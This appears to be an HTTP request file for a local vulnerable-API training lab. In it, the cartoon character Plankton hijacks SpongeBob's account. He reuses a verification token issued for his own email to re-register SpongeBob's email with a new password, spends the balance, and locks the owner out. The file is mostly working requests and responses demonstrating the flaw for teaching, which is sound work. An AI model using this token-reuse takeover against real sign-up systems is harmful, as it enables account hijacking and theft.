@base = http://localhost:8000/api/v106

# SpongeBob uses the system...
GET {{base}}/account/info
Authorization: Basic spongebob@bikinibottom.sea:i_l0ve_burg3rs

# {
#   "balance": "20.00",
#   "email": "spongebob@bikinibottom.sea",
#   "name": "SpongeBob SquarePants",
#   "orders": 1
# }

### Plankton wants to hijack SpongeBob's account and tries to register as him
POST {{base}}/auth/register
Content-Type: application/json

{
    "email": "spongebob@bikinibottom.sea"
}

# But it fails:
# {
#   "message": "email already taken",
#   "status": "error"
# }

### So, Plankton registers his own sock puppet account instead
POST {{base}}/auth/register
Content-Type: application/json

{
    "email": "plankton.jr@chum-bucket.sea"
}

# This request succeeds and sends a verification email to provided email
# {
#   "email": "plankton.jr@chum-bucket.sea",
#   "status": "verification_email_sent"
# }

### Plankton COULD create his own user with this token:
#POST {{base}}/auth/register
#Content-Type: application/json
#
#{
#    "token": "...",
#    "email": "plankton.jr@chum-bucket.sea",
#    "password": "...",
#    "name": "Plankton Jr."
#}
#
# {
#   "email": "plankton.jr@chum-bucket.sea",
#   "status": "user_created"
# }

### But, instead he overwrites SpongeBob's account, hijacking it!
# @prompt token Get the token from verification email, using Mailpit UI: http://127.0.0.1:8025/
POST {{base}}/auth/register
Content-Type: application/json

{
    "token": "{{token}}",
    "email": "spongebob@bikinibottom.sea",
    "password": "hijacked",
    "name": "SpongeBob"
}

# The user is created successfully!
# {
#   "email": "spongebob@bikinibottom.sea",
#   "status": "user_created"
# }

### Now, Plankton can access SpongeBob's order history and spend his credits!
GET {{base}}/account/info
Authorization: Basic spongebob@bikinibottom.sea:hijacked

# {
#   "balance": "0.00",
#   "email": "spongebob@bikinibottom.sea",
#   "name": "SpongeBob",
#   "orders": 1
# }

### Meanwhile SpongBob is surprised to see he is locked out.
GET {{base}}/account/info
Authorization: Basic spongebob@bikinibottom.sea:i_l0ve_burg3rs

# {
#   "error": "User authentication required"
# }
